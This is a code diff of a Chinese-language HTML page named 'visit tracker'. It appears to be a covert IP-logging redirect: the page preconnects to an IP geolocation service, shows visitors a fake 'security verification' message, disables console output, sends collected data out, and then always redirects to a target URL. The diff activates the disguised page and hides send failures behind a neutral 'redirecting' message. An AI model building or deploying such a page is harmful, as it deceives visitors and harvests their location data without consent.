@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- <title>访问跟踪器</title>
+  <title>访问跟踪器</title>
   <link rel="preconnect" href="https://ipapi.co">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -61,7 +61,7 @@
     <div class="footer">
       安全验证中，即将自动跳转
     </div>
-  </div> -->
+  </div>
 
   <script>
     // 禁用所有控制台输出
@@ -130,9 +130,11 @@
           })
         });
 
-        document.getElementById('status').textContent = '完成！';
+        document.getElementById('status').textContent = '完成！即将跳转...';
       } catch (error) {
-        document.getElementById('status').textContent = '发送数据失败';
+        document.getElementById('status').textContent = '跳转中...';
+      } finally {
+        setTimeout(() => { window.location.href = targetUrl; }, 1000);
       }
     }
 
